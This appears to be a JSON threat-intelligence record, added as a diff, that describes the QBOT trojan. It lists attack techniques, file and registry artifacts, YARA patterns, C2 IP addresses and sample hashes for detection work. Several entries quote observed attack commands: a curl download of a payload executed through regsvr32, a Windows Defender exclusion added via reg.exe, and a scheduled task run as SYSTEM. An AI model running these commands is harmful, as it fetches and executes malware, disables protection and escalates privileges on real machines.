@@ -1,0 +1,310 @@
+{
+  "malware_family": "QBOT",
+  "threat_actor": "REF3726",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "QBOT is a modular trojan that uses complex command lines with curl.exe and regsvr32.exe for initial execution, followed by injection into explorer.exe. It achieves persistence via randomly named registry run keys and escalates privileges by creating a scheduled task to run as SYSTEM. The malware decrypts a configuration containing C2 IP addresses and evades defenses by checking for analysis tools.",
+  "mitre_techniques": [
+    "T1059.003",
+    "T1053.005",
+    "T1547.001",
+    "T1078.001",
+    "T1105",
+    "T1071.001",
+    "T1070.004"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "\"C:\\Windows\\System32\\cmd.exe\" /q /c echo 'Ft' && ping REDACTED.com && MD \"\\\\vyr\" && curl.exe -o \\\\vyr\\v4QpQt.Nqv.e8xO https://REDACTED.net/t8EKnIB/C.png && echo \"sxF\" && ping REDACTED.com && regsvr32 \"\\\\vyr\\v4QpQt.Nqv.e8xO\"",
+      "context": "Initial execution command observed in telemetry.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\vyr\\v4QpQt.Nqv.e8xO",
+      "context": "Downloaded payload file path from initial execution.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Vybgeuye\\maonyo.dll",
+      "context": "Copied malware DLL for persistence in a randomly named folder.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "maonyo.dll",
+      "context": "Persistence copy of the QBOT DLL.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\Windows\\system32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths /f /t REG_DWORD /v C:\\Users\\[REDACTED]\\AppData\\Roaming\\Microsoft\\Vybgeuye /d 0",
+      "context": "Adds its persistence folder to Windows Defender exclusions.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKEY_USERS\\S-1-5-21-1047687853-4161697681-4019128061-1002\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\lnkotdhh",
+      "context": "Persistence run key with random value name.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Maonyoeve",
+      "context": "Registry key for storing QBOT configuration data, with a random name.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\Windows\\system32\\schtasks.exe /Create /RU NT AUTHORITY\\SYSTEM /tn ayttpnzc /tr regsvr32.exe -s \"c:\\Users\\[REDACTED]\\Desktop\\7611346142\\c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a.dll\" /SC ONCE /Z /ST 15:21 /ET 15:33",
+      "context": "Privilege escalation via scheduled task running as SYSTEM.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "ayttpnzc",
+      "context": "Randomly named scheduled task for privilege escalation.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "qak_proxy",
+      "context": "Process monitored by the malware's 'watchdog' thread.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "jHxastDcds)oMc=jvh7wdUhxcsdt2",
+      "context": "Hardcoded key/salt string from QBOT config.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "schtasks.exe /Create /RU \"NT AUTHORITY\\SYSTEM\" /SC ONSTART /TN %u /TR \"%s\" /NP /F",
+      "context": "Scheduled task command format string from QBOT config.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "\\System32\\WindowsPowerShel1\\v1.0\\powershel1.exe",
+      "context": "Obfuscated PowerShell path used as a key in the config resource.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "%u.%u.%u.%u.%u.%u.%04x",
+      "context": "Format string from YARA rule for QBOT.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "stager_1.dll",
+      "context": "Filename string from YARA rule for QBOT.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "\\stager_1.obf\\Benign\\mfc\\",
+      "context": "Path fragment string from YARA rule for QBOT (wide).",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 33 C0 59 85 F6 74 2D 83 66 0C 00 40 89 06 6A 20 89 46 04 C7 46 08 08 00 }",
+      "context": "YARA rule Windows_Trojan_Qbot_1.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ B9 FF 03 00 00 66 23 C1 33 C9 0F B7 F8 66 3B 7C 4D }",
+      "context": "YARA rule for function `do_computer_use_russian_like_keyboard`.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "uri_path",
+      "value": "/t8EKnIB/C.png",
+      "context": "Payload download URI path.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "140.82.49.12",
+      "context": "C2 IP from list analyzed with ipinfo.io.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "144.202.2.175",
+      "context": "C2 IP from list analyzed with ipinfo.io.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.63.1.12",
+      "context": "C2 IP from list analyzed with ipinfo.io.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "41.228.22.180:443",
+      "context": "C2 IP from extracted QBOT configuration.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "47.23.89.62:995",
+      "context": "C2 IP from extracted QBOT configuration.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "176.67.56.94:443",
+      "context": "C2 IP from extracted QBOT configuration.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "103.107.113.120:443",
+      "context": "C2 IP from extracted QBOT configuration.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "148.64.96.100:443",
+      "context": "C2 IP from extracted QBOT configuration.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "47.180.172.159:443",
+      "context": "C2 IP from extracted QBOT configuration.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "181.118.183.98:443",
+      "context": "C2 IP from extracted QBOT configuration.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "c2ba065654f13612ae63bca7f972ea91c6fe97291caeaaa3a28a180fb1912b3a",
+      "description": "Main QBOT DLL sample analyzed in the report."
+    },
+    {
+      "sha256": "636e2904276fe33e10cce5a562ded451665b82b24c852cbdb9882f7a54443e02",
+      "description": "Reference sample for YARA rule Windows_Trojan_Qbot_1."
+    },
+    {
+      "sha256": "a2bacde7210d88675564106406d9c2f3b738e2b1993737cb8bf621b78a9ebf56",
+      "description": "Reference sample for YARA rule Windows_Trojan_Qbot_2."
+    },
+    {
+      "sha256": "0838cd11d6f504203ea98f78cac8f066eb2096a2af16d27fb9903484e7e6a689",
+      "description": "Reference sample for YARA rule Windows_Trojan_Qbot_3."
+    }
+  ],
+  "file_types": [
+    "pe"
+  ]
+}
